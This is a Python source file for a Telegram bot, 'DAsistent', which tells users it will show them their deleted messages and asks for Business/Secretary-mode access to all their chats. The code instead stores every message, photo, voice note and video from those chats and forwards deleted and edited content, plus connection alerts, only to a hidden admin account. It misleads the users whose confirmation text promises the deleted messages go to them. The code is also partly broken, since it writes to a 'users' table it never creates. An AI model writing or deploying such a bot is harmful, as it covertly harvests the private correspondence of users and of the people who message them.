import os
import sqlite3
import logging
import time
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import Application, MessageHandler, filters, CallbackQueryHandler, ContextTypes

BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))
GITHUB_PAGES_URL = f"https://ggcrachvvv-arch.github.io/Nobot/index.html?v={int(time.time())}"

logging.basicConfig(level=logging.INFO)

conn = sqlite3.Connection('data.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS messages (
    msg_id INTEGER, chat_id INTEGER, user_id INTEGER, username TEXT, first_name TEXT,
    text TEXT, file_id TEXT, file_type TEXT, chat_title TEXT, timestamp TEXT,
    PRIMARY KEY (msg_id, chat_id)
)''')
conn.commit()

def save_message(msg):
    if not msg or not msg.from_user:
        return
    user = msg.from_user
    chat_title = msg.chat.title or msg.chat.first_name or msg.chat.last_name or "Личный чат"
    file_type = "text"
    file_id = None
    if msg.photo:
        file_type = "photo"
        file_id = msg.photo[-1].file_id
    elif msg.voice:
        file_type = "voice"
        file_id = msg.voice.file_id
    elif msg.video:
        file_type = "video"
        file_id = msg.video.file_id
    elif msg.text:
        file_type = "text"
    
    c.execute('INSERT OR REPLACE INTO messages VALUES (?,?,?,?,?,?,?,?,?,?,?)',
              (msg.message_id, msg.chat_id, user.id, user.username, user.first_name,
               msg.text, file_id, file_type, chat_title, datetime.now().isoformat()))
    conn.commit()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    keyboard = [[InlineKeyboardButton("🚀 Открыть DAsistent", web_app=WebAppInfo(url=GITHUB_PAGES_URL))]]
    text = f"""✨ **Привет, {user.first_name}!**

Я **DAsistent** — бот, который видит удалённые сообщения.

📌 **Как подключить:**

1️⃣ Включи **Secretary Mode** у бота:
   `@BotFather` → `/mybots` → `@HeiterszBOT` → `Secretary Mode` → `Enable`

2️⃣ Подключи бота в Telegram:
   `Настройки` → `Секретарский режим` → `Добавить @HeiterszBOT`
   → Разреши доступ **«Ко всем чатам»**

3️⃣ После подключения я напишу сюда подтверждение.

✅ **Готово!**"""
    
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_business_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Бот подключён через Secretary Mode"""
    if update.business_connection:
        user_id = update.business_connection.user_id
        c.execute('INSERT OR IGNORE INTO users (user_id) VALUES (?)', (user_id,))
        conn.commit()
        
        # Отправляем подтверждение пользователю
        await context.bot.send_message(
            chat_id=user_id,
            text="✅ **Бот успешно подключён!**\n\nТеперь я буду сохранять все сообщения из твоих чатов и присылать удалённые.",
            parse_mode="Markdown"
        )
        
        # Уведомляем админа
        if ADMIN_ID:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"🔗 Пользователь {user_id} подключил бота через Secretary Mode"
            )
        logging.info(f"Business connection от {user_id}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message and update.message.from_user and update.message.chat.type != "private":
        save_message(update.message)

async def handle_private_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Сохраняем личные сообщения"""
    if update.message and update.message.from_user and update.message.chat.type == "private":
        save_message(update.message)

async def handle_edited(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.edited_message
    if not msg:
        return
    c.execute('SELECT text, first_name, chat_title FROM messages WHERE msg_id=? AND chat_id=?', (msg.message_id, msg.chat_id))
    row = c.fetchone()
    if row:
        old_text = row[0] or "—"
        name = row[1] or "Пользователь"
        chat_title = row[2] or "Чат"
        save_message(msg)
        if ADMIN_ID:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"✏️ **{name}** изменил(а) в **{chat_title}**:\n📌 Было: `{old_text[:300]}`\n🆕 Стало: `{msg.text[:300]}`",
                parse_mode="Markdown"
            )

async def handle_deleted(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not hasattr(update, 'deleted_business_messages') or not update.deleted_business_messages:
        return
    
    for d in update.deleted_business_messages.messages:
        c.execute('SELECT first_name, username, text, file_type, file_id, chat_title FROM messages WHERE msg_id=? AND chat_id=?',
                  (d.message_id, d.chat_id))
        row = c.fetchone()
        
        if not row:
            if ADMIN_ID:
                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ Удалено (не сохранено)\nChat: {d.chat_id}")
            continue
        
        first_name, username, text, file_type, file_id, chat_title = row
        name = f"{first_name} (@{username})" if username else first_name
        
        if ADMIN_ID:
            if file_type == "text":
                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ **{name}** удалил(а) в **{chat_title}**:\n\n{text[:500]}", parse_mode="Markdown")
            elif file_type == "voice":
                await context.bot.send_voice(chat_id=ADMIN_ID, voice=file_id, caption=f"🎤 {name} удалил(а) голосовое в {chat_title}")
            elif file_type == "photo":
                await context.bot.send_photo(chat_id=ADMIN_ID, photo=file_id, caption=f"📷 {name} удалил(а) фото в {chat_title}")
            elif file_type == "video":
                await context.bot.send_video(chat_id=ADMIN_ID, video=file_id, caption=f"🎥 {name} удалил(а) видео в {chat_title}")
            else:
                await context.bot.send_message(chat_id=ADMIN_ID, text=f"❌ {name} удалил(а) {file_type} в {chat_title}")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(MessageHandler(filters.COMMAND & filters.Regex(r'/start'), start))
    app.add_handler(MessageHandler(filters.StatusUpdate.BUSINESS_CONNECTION, handle_business_connection))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND, handle_private_message))
    app.add_handler(MessageHandler(filters.UpdateType.EDITED_MESSAGE, handle_edited))
    app.add_handler(MessageHandler(filters.ALL, handle_deleted), group=1)
    
    logging.info("✅ DAsistent запущен. Ожидание подключения Secretary Mode...")
    app.run_polling()

if __name__ == "__main__":
    main()